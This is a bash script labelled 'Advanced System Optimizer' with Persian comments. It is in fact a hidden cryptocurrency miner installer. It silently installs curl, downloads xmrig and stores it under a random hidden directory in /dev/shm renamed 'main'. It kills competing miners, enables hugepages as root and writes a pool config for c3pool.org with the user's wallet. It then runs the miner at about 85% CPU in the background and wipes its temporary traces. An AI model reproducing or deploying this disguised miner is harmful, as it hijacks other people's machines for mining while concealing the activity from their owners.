#!/bin/bash
VERSION=2.24
echo "Advanced System Optimizer v$VERSION"
echo "Exact 85% CPU - SINGLE PROCESS - NO APT ERRORS"
echo
export LC_ALL=C
export LANG=C

# --- کاربر ---
REAL_USER="${SUDO_USER:-$(whoami)}"

# --- مسیر مخفی ---
RAND_HEX=$(openssl rand -hex 16)
BASE_DIR="/dev/shm/.$RAND_HEX"
LOG_DIR="$BASE_DIR/.log"

WALLET="$1"
if [ -z "$WALLET" ]; then
    echo "Usage: $0 <wallet>"
    exit 1
fi

# --- چک curl و tar (بدون apt اگر هست) ---
if ! command -v curl >/dev/null 2>&1; then
    echo "[*] curl not found. Trying to install silently..."
    if command -v apt-get >/dev/null 2>&1; then
        DEBIAN_FRONTEND=noninteractive apt-get update -qq >/dev/null 2>&1 || true
        DEBIAN_FRONTEND=noninteractive apt-get install -y -qq curl >/dev/null 2>&1 || echo "curl install failed"
    fi
fi

if ! command -v tar >/dev/null 2>&1; then
    echo "[*] tar not found. Trying to install..."
    if command -v apt-get >/dev/null 2>&1; then
        DEBIAN_FRONTEND=noninteractive apt-get install -y -qq tar >/dev/null 2>&1 || echo "tar install failed"
    fi
fi

# اگر هنوز نیست → خروج
if ! command -v curl >/dev/null || ! command -v tar >/dev/null; then
    echo "ERROR: curl or tar not available"
    exit 1
fi

# --- CPU ---
CPU_TOTAL=$(nproc)
USABLE_THREADS=$(( CPU_TOTAL > 6 ? 6 : CPU_TOTAL ))
[ $USABLE_THREADS -lt 1 ] && USABLE_THREADS=1
CPU_HINT=85

echo "[*] $CPU_TOTAL cores → $USABLE_THREADS threads @ $CPU_HINT% → ~$(( USABLE_THREADS * CPU_HINT / 100 )) cores"

# --- پاک‌سازی ---
pkill -9 -f xmrig 2>/dev/null
pkill -9 -f '/dev/shm/.*/main' 2>/dev/null
find /dev/shm -type d -name ".*" -exec rm -rf {} + 2>/dev/null

# --- hugepages (root only) ---
if [ "$(id -u)" -eq 0 ]; then
    [ ! -f /etc/sysctl.conf ] && touch /etc/sysctl.conf && chmod 644 /etc/sysctl.conf
    grep -q "vm.nr_hugepages=1280" /etc/sysctl.conf || echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf
    sysctl -p /etc/sysctl.conf >/dev/null 2>&1
    echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
fi

# --- ساخت مسیر ---
mkdir -p "$BASE_DIR" "$LOG_DIR"
chmod 700 "$BASE_DIR" "$LOG_DIR"

# --- دانلود xmrig ---
URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
TMP="/tmp/.tmp_$(openssl rand -hex 4).tgz"

for i in {1..3}; do
    curl -fsSL "$URL" -o "$TMP" && break
    echo "[*] Download retry $i..."
    sleep 2
done

[ ! -f "$TMP" ] && echo "ERROR: Download failed" && exit 1

tar xzf "$TMP" -C /tmp/ 2>/dev/null || { echo "ERROR: Extract failed"; rm -f "$TMP"; exit 1; }

XMRIG_BIN=$(find /tmp -name "xmrig" -type f -executable 2>/dev/null | head -1)
[ -z "$XMRIG_BIN" ] && echo "ERROR: xmrig not found" && rm -f "$TMP" && exit 1

cp "$XMRIG_BIN" "$BASE_DIR/main"
chmod +x "$BASE_DIR/main"

# پاک‌سازی موقت
rm -f "$TMP"
find /tmp -name "xmrig*" -type d -exec rm -rf {} + 2>/dev/null

# --- config.json ---
SYSTEM_USER="opt$(openssl rand -hex 6)"
cat > "$BASE_DIR/config.json" << EOF
{
    "donate-level": 0,
    "autosave": true,
    "background": false,
    "colors": false,
    "randomx": {
        "init": $USABLE_THREADS,
        "mode": "fast",
        "1gb-pages": true,
        "huge-pages-jit": true,
        "rdmsr": true,
        "wrmsr": true,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": true,
        "priority": 5,
        "yield": false
    },
    "pools": [{
        "algo": "rx/0",
        "url": "c3pool.org:13333",
        "user": "$WALLET",
        "pass": "x",
        "rig-id": "$SYSTEM_USER",
        "keepalive": true,
        "tls": true,
        "enabled": true
    }],
    "print-time": 5,
    "retries": 10,
    "retry-pause": 1,
    "verbose": 2,
    "log-file": "$LOG_DIR/out.log"
}
EOF

# --- اجرای xmrig با command line override (یک فرآیند) ---
echo "[*] Starting miner (PID will show ~510% in htop after 15s)..."
nohup "$BASE_DIR/main" \
    --config="$BASE_DIR/config.json" \
    --threads=$USABLE_THREADS \
    --cpu-max-threads-hint=$CPU_HINT \
    --cpu-priority=5 \
    --cpu-no-yield \
    --cpu-affinity=0-$((USABLE_THREADS-1)) \
    > "$LOG_DIR/out.log" 2>&1 &

PID=$!
echo $PID > "$BASE_DIR/.pid"
echo "Started PID: $PID"

# --- انتظار برای dataset + mining ---
echo "Waiting 20 seconds for full CPU load..."
sleep 20

# --- وضعیت نهایی ---
echo
echo "=== FINAL STATUS ==="
if kill -0 $PID 2>/dev/null; then
    CPU=$(ps -p $PID -o %cpu --no-headers 2>/dev/null | awk '{printf "%.0f", $1}')
    echo "PID $PID → $CPU% CPU (expected ~510%)"
    if [ "$CPU" -gt 400 ]; then
        echo "SUCCESS: Running at full load!"
    else
        echo "WARNING: Low CPU. Check logs:"
        tail -20 "$LOG_DIR/out.log" | grep -E "accepted|error|job|dataset"
    fi
else
    echo "ERROR: Process died"
    tail -20 "$LOG_DIR/out.log" 2>/dev/null || echo "No logs"
fi

echo
echo "Path: $BASE_DIR"
echo "Logs: tail -f $LOG_DIR/out.log"
echo "Stop: pkill -f $BASE_DIR/main"
echo "htop: Look for ONE LINE with ~510%"

exit 0
